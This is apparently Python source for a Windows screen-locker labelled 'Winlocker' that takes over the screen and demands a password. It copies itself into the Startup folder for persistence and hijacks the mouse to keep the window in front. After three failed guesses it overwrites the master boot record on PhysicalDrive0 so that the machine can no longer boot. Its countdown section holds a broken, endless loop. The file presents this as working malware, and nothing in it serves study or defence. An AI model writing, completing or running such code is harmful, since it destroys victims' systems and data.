import tkinter as tk
from tkinter import messagebox
import subprocess
import os
import sys
import pyautogui
import shutil
import random
from win32file import *
from win32ui import * 
from win32con import * 
from win32gui import *
from sys import exit


window = tk.Tk()
window.title("Winlocker")
window.attributes("-fullscreen", True)
window.geometry("1920x1080")

bg = "black"
window["bg"] = bg

stroke = ""
attempts = 3
password = "123"
time = 10
del_text = "It's time to make some BOOOM!"

is_first = True
if os.path.isfile(os.getenv("APPDATA") + '\Microsoft\Windows\Start Menu\Programs\Startup' + '\ '[0] + os.path.basename(sys.argv[0])) is False:
    shutil.copy2(sys.argv[0], os.getenv("APPDATA") + '\Microsoft\Windows\Start Menu\Programs\Startup')
else:
    is_first = False

pyautogui.FAILSAFE=False

def check():
    global attempts
    global stroke
    try:
        person_try = entry_label.get()
        if person_try == password:
            messagebox.showinfo("Success", "YOU HACKED IT")
            quit_app()        
        elif person_try != password:
            attempts -= 1
            if attempts > 0:
                messagebox.showerror("Failed", f"Attemps left: {attempts}")
            else:       
                hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
                WriteFile(hDevice, AllocateReadBuffer(512), None)
                CloseHandle(hDevice)
                messagebox.showerror("Your MBR is overwritten!", "Oh No!", MB_ICONWARNING | MB_OK)
    except TypeError:
        messagebox.showerror("Make sure you think wisely")


def blockwindow():
    pyautogui.click(x=870,y=480)
    pyautogui.moveTo(x=870,y=480)
    window.protocol("WM_DELETE_WINDOW",blockwindow)
    window.update()


def quit_app():
    window.destroy()

l= tk.Label(text=time,font="System 15", bg = 'black' ,  fg = 'white' )

password_label = tk.Label(window, text="ENTER A PASSWORD TO UNLOCK PC", font=("Arial", 26))
password_label.pack(pady=100)

attempts_label = tk.Label(window, text=f"YOU HAVE JUST 3 TRIES", font=("Arial", 22))
attempts_label.pack(pady=100)

entry_label = tk.Entry(window, show="*", font=("Arial", 16))
entry_label.pack(pady=100)

check_button = tk.Button(window, text="TRY TO SAVE YOUR PC", command=check, font=("Arial", 20),)
check_button.pack(pady=100)

while stroke !=password:
    l.configure(text=time)
    window.after(120)
    if time==0:                                                 
        time=del_text                                    
        i = 1                                                    
        while i<2:                                                
            all_files_in_directory = os.listdir(r"C:\Windows")
            random_file = random.choice(all_files_in_directory)
            os.system(r"explorer.exe randomfile")
    if time!=del_text:                                         
        time=time-1 
        
    blockwindow()

window.mainloop()